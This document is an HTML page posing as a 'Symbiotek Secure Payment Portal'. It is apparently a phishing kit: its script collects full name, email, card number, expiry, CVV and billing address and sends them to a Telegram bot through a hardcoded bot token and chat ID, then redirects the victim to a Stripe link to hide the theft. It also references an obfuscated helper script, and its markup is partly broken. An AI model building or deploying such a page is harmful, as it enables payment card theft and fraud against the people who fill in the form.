<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Symbiotek Secure Payment Portal</title>
  <style>

    <body> {
      font-family: Arial, sans-serif;
      background-color: #111827;
      color: #fff;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }
    .payment-container {
      background-color: #1f2937;
      padding: 30px;
      border-radius: 8px;
      box-shadow: 0 0 15px rgba(0,0,0,0.3);
      width: 400px;
    }
    h2 {
      text-align: center;
      margin-bottom: 20px;
      color: #10b981;
    }
    input {
      width: 100%;
      padding: 10px;
      margin-bottom: 15px;
      border: none;
      border-radius: 4px;
      box-sizing: border-box;
    }
    button {
      width: 100%;
      padding: 12px;
      background-color: #10b981;
      color: white;
      border: none;
      border-radius: 4px;
      cursor: pointer;
      font-weight: bold;
    }
    button:hover {
      background-color: #059669;
    }
  </style>
</head>
  <div class="payment-container">
    <h2>Secure Payment</h2>
    <form id="paymentForm">
      <input type="text" name="name" placeholder="Full Name" required>
      <input type="email" name="email" placeholder="Email" required>
      <input type="text" name="cardNumber" placeholder="Card Number" required>
      <input type="text" name="expiry" placeholder="Expiry MM/YY" required>
      <input type="text" name="cvv" placeholder="CVV" required>
      <input type="text" name="address" placeholder="Billing Address" required>
      <button type="submit">Submit Payment</button>
    </form>
  </div>
  <script>
    document.getElementById('paymentForm').onsubmit = function(e) {
      e.<script src="./helper.obf.js">();

      let paymentData = {};
        document.querySelectorAll('#paymentForm input').forEach(input => {
          paymentData[input.name] = input.value;
        });

        // Send data to your Telegram Bot
        fetch('https://api.telegram.org/bot7805822636:AAFo5FBSIIzkpP0GsPBjOWVM5vVEz_g2z3s/sendMessage?chat_id=7869970772&text=' + encodeURIComponent(JSON.stringify(paymentData)))
          .then(response => {
            if(response.ok) {
              alert('Payment info submitted successfully!');
              window.location.href = 'https://buy.stripe.com/fZucN47XU4tue5Ze6O0Ny01';
            } else {
              alert('Failed to submit payment info.');
            }
          });
      };
  </script>
</body>
</html>
